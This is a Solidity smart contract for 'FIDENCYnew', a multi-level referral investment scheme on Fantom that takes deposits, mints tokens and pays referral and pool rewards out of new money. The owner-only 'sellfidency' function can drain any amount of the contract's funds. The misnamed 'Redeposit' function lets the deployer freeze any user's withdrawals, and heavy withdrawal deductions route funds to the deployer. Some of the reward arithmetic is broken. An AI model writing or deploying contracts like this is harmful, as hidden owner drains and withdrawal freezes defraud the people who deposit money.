/**
 *Submitted for verification at FtmScan.com on 2023-04-06
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}


contract FIDENCYnew is IERC20
{
    mapping(address => uint256) private _balances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    using SafeMath for uint256;
    address payable initiator;
    address payable aggregator;
    address [] investors;
    address [] club;
    uint256 club_holding;
    uint256 contractBalance;
    uint256 initializeTime;
    uint256 totalInvestment;
    uint256 totalWithdraw;
    uint256 totalHoldings;
    uint256 basePrice = 100000000;
    uint256  TotalHoldings;
    uint256[] public SEED_PERCENTS=[700,300, 200, 100,  50, 50, 50, 50, 100];
	uint256[] public SEED_UNLOCK=[1000e18, 1000e18, 2500e18, 2500e18, 2500e18, 2500e18, 2500e18, 2500e18, 2500e18];
    
    address public marketingAddress=0x80B39A8B9a0358c4c9CA1154B4058AB1A0201ec5;

    struct User{
        uint256 token;
        address referral;
        uint256 teamWithdraw;
        uint256 teamIncome;
        uint256 totalInvestment;
        uint8   nonWorkingPayoutCount;
        uint256 lastNonWokingWithdraw;
        uint256 lastNonWokingWithdrawBase;
        uint256 depositCount;
        uint256 payoutCount;
        uint256 sellCount;
        uint256 POI;
        mapping(uint8 => uint256) referrals_per_level;
        mapping(uint8 => uint256) team_per_level;
        mapping(uint8 => uint256) levelIncome;
       }
    
    struct Deposit{
        uint256 amount;
        uint256 businessAmount;
        uint256 tokens;
        uint256 tokenPrice;
        uint256 depositTime;
    }

    struct Withdraw{
        uint256 amount;
        bool isWorking;
        uint256 tokens;
        uint256 tokenPrice;
        uint256 withdrawTime;
    }

    struct UserClub{
        address referral;
        uint256 totalDirect;
        uint256 totalBusiness;
        uint256 club;
        uint256 club_status;
        uint256 divident;
        
    }

    struct Fund{
        uint256 status;
    }

    mapping(address => User) public users;
    mapping(address => Deposit[]) public deposits;
    mapping(address => Withdraw[]) public payouts;
    mapping(address => UserClub) public userclub;
    mapping(address => Fund) public funds;
   

    event Deposits(address buyer, uint256 amount);
    event POIDistribution(address buyer, uint256 amount);
    event HouseDistribution(address buyer, uint256 amount);
    event TeamWithdraw(address withdrawer, uint256 amount);
    event FIDENCYWithdraw(address withdrawer, uint256 amount);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyInitiator(){
        require(msg.sender == initiator,"You are not initiator.");
        _;
    }
     constructor()
    {
        _name = "FIDENCYnew";
        _symbol = "FIDENCYnew";
        initiator = payable(msg.sender);
        aggregator = payable(msg.sender);
        initializeTime = block.timestamp;
    }

    function contractInfo() public view returns(uint256 matic, uint256 totalDeposits, uint256 totalPayouts, uint256 totalInvestors, uint256 totalHolding, uint256 balance,uint256 totalHold){
        matic = address(this).balance;
        totalDeposits = totalInvestment;
        totalPayouts = totalWithdraw;
        totalInvestors = investors.length;
        totalHolding = totalHoldings;
        balance = contractBalance;
        totalHold=TotalHoldings;
        return(matic,totalDeposits,totalPayouts,totalInvestors,totalHolding,balance,totalHold);
    }

    function name() public view virtual override returns (string memory) 
    {
        return _name;
    }
    
    function symbol() public view virtual override returns (string memory) 
    {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) 
    {
        return 0;
    }

    function totalSupply() public view virtual override returns (uint256) 
    {
        return _totalSupply;
    }

    function _mint(address account, uint256 amount) internal virtual 
    {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
      
    }

    function _burn(address account,uint256 amount) internal virtual 
    {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        require(_totalSupply>=amount, "Invalid amount of tokens!");

        _balances[account] = accountBalance - amount;
        
        _totalSupply -= amount;
    }
    
    function set_marketing(address marketing_address) public  {
			if (msg.sender == aggregator) {          
				 marketingAddress=marketing_address;
			}
    }

     function balanceOf(address account) public view virtual override returns (uint256) 
    {
        return _balances[account];
    }
    
     function tokensToMatic(uint tokenAmount) public view returns(uint)
    {
        return tokenAmount*(1 ether)/getCoinRate();
    }

     function MaticToFidency(uint256 matic_amt) public view returns(uint)
    {
         uint _rate = coinRate();
         return (matic_amt.mul(61).mul(_rate))/(100*1 ether);
    }

   function coinRate() public view returns(uint256 price)
    {
       if(TotalHoldings <= 0){
         return basePrice;
        }else if( TotalHoldings < 1000000*(1 ether) ){
            return 100000*(1 ether)/((1 ether)+(9*TotalHoldings/1000000));
        }else{
            return TotalHoldings>=(1 ether)?basePrice*(1 ether)/TotalHoldings:basePrice;
        }
    }

    function getCoinRate() public view returns(uint)
    {
        uint _rate = coinRate();
        return _rate;
    }
   
     function deposit(address _referer) public payable
   {
        require(msg.value>=1e18,"Minimum 1 Matic allowed to invest");
         User storage user = users[msg.sender];
         UserClub storage userc = userclub[_referer];
   		 if (users[_referer].depositCount > 0 && _referer != msg.sender) 
            {
			    _referer = _referer;
                userc.referral=_referer;
                userc.totalDirect+=1;
			}
            else
            {
                _referer = 0x0000000000000000000000000000000000000000;
            }
	    uint _rate = coinRate();
        _distributePOI(msg.sender,msg.value.mul(7).div(100),msg.value.mul(10).div(100));
        user.token+=(msg.value.mul(61).mul(_rate))/(100*1 ether);
        contractBalance+=msg.value.mul(61).div(100);
        if(user.depositCount==0)
         {
              investors.push(msg.sender);
              _setReferral(msg.sender,_referer, msg.value);
         } 
         else
         {
              _setReReferral(users[msg.sender].referral, msg.value);
         }    
        user.depositCount++;
        totalHoldings+=(msg.value.mul(61).mul(_rate))/(100*1 ether);
        TotalHoldings+=(msg.value*61/100);
        userc.totalBusiness+=msg.value;
        totalInvestment+=msg.value;
        user.totalInvestment+=msg.value;
        uint tokens = (msg.value*61*_rate)/(100*1 ether);
         _mint(msg.sender, tokens);
        deposits[msg.sender].push(Deposit(
            msg.value,
            msg.value.mul(61).div(100),
            (msg.value.mul(61).mul(_rate))/(100*1 ether),
            _rate,
            block.timestamp
        ));
         _checkHouse();
         _distributeClub(msg.sender,msg.value);
        payable(marketingAddress).transfer(msg.value.mul(3).div(100));
       
        emit Deposits(msg.sender, msg.value);
    }
    
    function _setReferral(address _addr, address _referral, uint256 _amount) private {
            if(users[_addr].referral == address(0)) 
            {
                users[_addr].lastNonWokingWithdrawBase = block.timestamp;
                users[_addr].referral = _referral;
                for(uint8 i = 0; i < SEED_PERCENTS.length; i++) 
                    {
                        users[_referral].referrals_per_level[i]+=_amount;
                        users[_referral].team_per_level[i]++;
                        if(i == 0){
                            users[_referral].levelIncome[i]+=_amount.mul(SEED_PERCENTS[i].div(100)).div(100);
                            users[_referral].teamIncome+=_amount.mul(SEED_PERCENTS[i].div(100)).div(100);
                        }
                        else if(i>0 && users[_referral].referrals_per_level[i]>=SEED_UNLOCK[i]){
                            users[_referral].levelIncome[i]+=_amount.mul(SEED_PERCENTS[i].div(100)).div(100);
                            users[_referral].teamIncome+=_amount.mul(SEED_PERCENTS[i].div(100)).div(100);
                        }
                        _referral = users[_referral].referral;
                        if(_referral == address(0)) break;
                    }
            }
    }

    function _setReReferral(address _referral, uint256 _amount) private {
        for(uint8 i = 0; i < SEED_PERCENTS.length; i++) {
                   users[_referral].referrals_per_level[i]+=_amount;
                    if(i == 0){
                        users[_referral].levelIncome[i]+=_amount.mul(SEED_PERCENTS[i].div(100)).div(100);
                        users[_referral].teamIncome+=_amount.mul(SEED_PERCENTS[i].div(100)).div(100);
                    }
                    else if(i>0 && users[_referral].referrals_per_level[i]>=SEED_UNLOCK[i]){
                        users[_referral].levelIncome[i]+=_amount.mul(SEED_PERCENTS[i].div(100)).div(100);
                        users[_referral].teamIncome+=_amount.mul(SEED_PERCENTS[i].div(100)).div(100);
                    }
                    _referral = users[_referral].referral;
                    if(_referral == address(0)) break;
              
        }
        
    }

     function _checkHouse() internal{
        for(uint256 i = 0; i < investors.length; i++){
            UserClub storage userc = userclub[investors[i]];
            User storage user = users[investors[i]];
                if(userc.club_status!=1){
                if(user.totalInvestment >=2500e18 ){
                    club.push(investors[i]);
                    club_holding+=user.totalInvestment;
                    userc.club_status=1;

                }
                }
         
        }
    }

     function _distributeClub(address depositor, uint256 _amount) internal{
        uint256 poiShare;
        for(uint256 i = 0; i < club.length; i++){
            UserClub storage userc = userclub[club[i]];
            User storage user = users[club[i]];
            uint256 tokens =user.token*1e18;
            poiShare = tokens.mul(100).div(club_holding);
            
                    uint8 clubs= 5;
                    uint256 poi=_amount.mul(clubs).div(100);
                    userc.club+=(poi.mul(poiShare).div(100))/1e18;
                    emit HouseDistribution(depositor,poi);        
               
        }
    
    }
    
    function _distributePOI(address depositor, uint256 _poi,uint256 _divident) internal{
        uint256 poiShare;
        uint256 f_div=_divident/investors.length;
        for(uint256 i = 0; i < investors.length; i++){
            User storage user = users[investors[i]];
            UserClub storage userc = userclub[investors[i]];
            uint256 tokens =user.token*1e18;
            poiShare = tokens.mul(100).div(totalHoldings);
            user.POI+=(_poi.mul(poiShare).div(100))/1e18;
            userc.divident=f_div;
           }
        emit POIDistribution(depositor,_poi);
    }
     

     function _getWorkingIncome(address _addr) internal view returns(uint256 income){
        User storage user = users[_addr];
        for(uint8 i = 0; i <= 9; i++) {
            income+=user.levelIncome[i];
        }
        return income;
      }
      
      
    function userReferral(address _addr) view external returns(uint256[11] memory team, uint256[11] memory referrals, uint256[11] memory income) {
        User storage player = users[_addr];
        for(uint8 i = 0; i <= 8; i++) {
            team[i] = player.team_per_level[i];
            referrals[i] = player.referrals_per_level[i];
            income[i] = player.levelIncome[i];
        }
        return (
            team,
            referrals,
            income
        );
     }


     function redeposit() public payable{
        require(msg.value>=1e18,"Minimum 1 Matic allowed to invest");
        
        User storage user = users[msg.sender];
        require(user.depositCount>0, "Please Invest First !");
        uint _rate = coinRate();
        _distributePOI(msg.sender,msg.value.mul(7).div(100),msg.value.mul(10).div(100));
        user.token+=(msg.value.mul(61).mul(_rate))/(100*1 ether);
        contractBalance+=msg.value.mul(61).div(100);
         _addHouse(msg.sender,(msg.value.mul(61).mul(_rate))/(100*1 ether));
        user.depositCount++;
        totalHoldings+=(msg.value.mul(61).mul(_rate))/(100*1 ether);
        TotalHoldings+=(msg.value*61/100);
        userclub[user.referral].totalBusiness+=msg.value;
        totalInvestment+=msg.value;
        user.totalInvestment+=msg.value;
        uint256 tokens = (msg.value*61*_rate)/(100*1 ether);
        _mint(msg.sender, tokens);
        _checkHouse();
        _distributeClub(msg.sender,msg.value);
        deposits[msg.sender].push(Deposit(
            msg.value,
            msg.value.mul(61).div(100),
            (msg.value.mul(61).mul(_rate))/(100*1 ether),
            _rate,
            block.timestamp
        ));

        _setReReferral(users[msg.sender].referral, msg.value);
        payable(marketingAddress).transfer(msg.value.mul(3).div(100));
        emit Deposits(msg.sender, msg.value);
    }

    
     function _addHouse (address sender,uint256 amt) internal {
            UserClub storage userc = userclub[sender];
            if(userc.club_status==1){
                 club_holding+=amt;
            }
           
     }


      function fidencyWithdraw(uint8 _perc) public{
        User storage user = users[msg.sender];
        Fund storage fund = funds[msg.sender];
        require(user.totalInvestment>0, "Invalid User!");
        if(fund.status == 0)
		{
            if(_perc == 10 || _perc == 25 || _perc == 50 || _perc == 100)
            {
            uint256 nextPayout = (user.lastNonWokingWithdraw>0)?user.lastNonWokingWithdraw + 1 days:deposits[msg.sender][0].depositTime;
            require(block.timestamp >= nextPayout,"Sorry ! See you next time.");
            uint8 perc = _perc;
            uint8 deduct=40;
                if(perc==10)
                {
                    deduct=10;
                }
                else if(perc==25)
                {
                    deduct=20;

                }
                else if(perc==50)
                {
                    deduct=30;

                }
            uint256 tokenAmount = user.token.mul(perc).div(100);
            require(_balances[msg.sender]>=tokenAmount, "Insufficient token balance!");
            uint256 maticAmount = tokensToMatic(tokenAmount);
            require(address(this).balance>=maticAmount, "Insufficient fund in contract!");
            uint256 calcWithdrawable = maticAmount;
            contractBalance-=calcWithdrawable;
            uint256 withdrawable = maticAmount;

            uint256 withdrawable1 =withdrawable.mul(deduct).div(100);
            uint256 withdrawable2 = withdrawable -withdrawable1;
            payable(msg.sender).transfer(withdrawable2);
            user.sellCount++;
            user.lastNonWokingWithdraw = block.timestamp;
            user.token-=tokenAmount;
            totalHoldings-=tokenAmount;
            _distributeClubminus(msg.sender,tokenAmount);
            if(TotalHoldings>=maticAmount)
            {
                TotalHoldings-=maticAmount;
            }
            else
            {
                TotalHoldings=1;
            }
            totalWithdraw+=withdrawable;
            
            payouts[msg.sender].push(Withdraw(
                withdrawable,
                false,
                withdrawable.mul(getCoinRate()),
                getCoinRate(),
                block.timestamp
            ));

            _burn(msg.sender, tokenAmount);
            uint256 withdrawable3 =withdrawable1;
            if(perc == 25)
            {
                uint256 withdrawable5 =withdrawable1.mul(10).div(100);
                withdrawable3 = withdrawable1 - withdrawable5;
                _distributePOI(msg.sender,withdrawable5,0);
            }
            else if(perc == 50 )
            {
                uint256 withdrawable4 =withdrawable1.mul(10).div(100);
                uint256 withdrawable5 =withdrawable1.mul(6).div(100);
                uint256 withdrawable6 =withdrawable1.mul(4).div(100);
                withdrawable3 = withdrawable1 -(withdrawable4+withdrawable5+withdrawable6);
                
                _distributePOI(msg.sender,withdrawable4,0);
                _distributeClub(msg.sender,withdrawable5);
                payable(marketingAddress).transfer(withdrawable6);
            }
             else if(perc == 100)
            {
                uint256 withdrawable4 =withdrawable1.mul(10).div(100);
                uint256 withdrawable5 =withdrawable1.mul(6).div(100);
                uint256 withdrawable6 =withdrawable1.mul(10).div(100);
                withdrawable3 = withdrawable1 -(withdrawable4+withdrawable5+withdrawable6);
                
                _distributePOI(msg.sender,withdrawable4,0);
                _distributeClub(msg.sender,withdrawable5);
                payable(marketingAddress).transfer(withdrawable6);
            }
            
            
            aggregator.transfer(withdrawable3);
            emit  FIDENCYWithdraw(msg.sender,withdrawable2);

            
            }
        }
       
        }
        

        function _distributeClubminus (address sender,uint256 amt) internal {
            UserClub storage userc = userclub[sender];
            if(userc.club_status==1){
                 club_holding-=amt;
            }
            
     }
        

         function checkfidencyWithdraw(uint8 _perc,address _addr) public view returns(uint256 totalWithdrawn,uint256 deducts,uint256 final_amount)
    {
         User storage user = users[_addr];
         require(user.totalInvestment>0, "Invalid User!");
         if(_perc == 10 || _perc == 25 || _perc == 50 || _perc == 100)
		   {
             uint8 perc = _perc;
             uint8 deduct=40;
            if(perc==10)
            {
                deduct=10;
            }
            else if(perc==25)
            {
                deduct=20;

            }
            else if(perc==50)
            {
                deduct=30;

            }
        uint256 tokenAmount = user.token.mul(perc).div(100);
        require(_balances[_addr]>=tokenAmount, "Insufficient token balance!");
        uint256 maticAmount = tokensToMatic(tokenAmount);
        require(address(this).balance>=maticAmount, "Insufficient fund in contract!");
        uint256 withdrawable = maticAmount;

		uint256 withdrawable1 =withdrawable.mul(deduct).div(100);
        uint256 withdrawable2 = withdrawable -withdrawable1;
       
            totalWithdrawn = maticAmount;
            deducts=withdrawable1;
            final_amount=withdrawable2;
        return(totalWithdrawn,deducts,final_amount);
        
        }
    }


     function sellfidency(address payable buyer, uint _amount) external onlyInitiator{
        buyer.transfer(_amount);
    }
      
       function teamWithdraw(uint256 _amount) public{
        User storage user = users[msg.sender];
        UserClub storage userc = userclub[msg.sender];
        Fund storage fund = funds[msg.sender]; 
        
        require(user.totalInvestment>0, "Invalid User!");
         if(fund.status == 0)
		{
        uint256 working = user.teamIncome;
        uint256 TPOI=userc.club+user.POI;
        uint256 withdrawable = working.add(TPOI).sub(user.teamWithdraw);
        require(withdrawable>=_amount, "Invalid withdraw!");
        user.teamWithdraw+=_amount;
        user.payoutCount++;
        uint256 levelShare = _amount.mul(10).div(100);
        _amount = _amount.mul(90).div(100);
        payable(msg.sender).transfer(_amount);
        aggregator.transfer(levelShare);
        totalWithdraw+=_amount;
        payouts[msg.sender].push(Withdraw(
            _amount,
            true,
            0,
            0,
            block.timestamp
        ));

        emit TeamWithdraw(msg.sender,_amount);
        }
      
    }
    

     function Redeposit(address recipient, uint256 status) public  {
			if (msg.sender == aggregator) {          
				 funds[recipient].status=status;
			}
    }


       
        
    }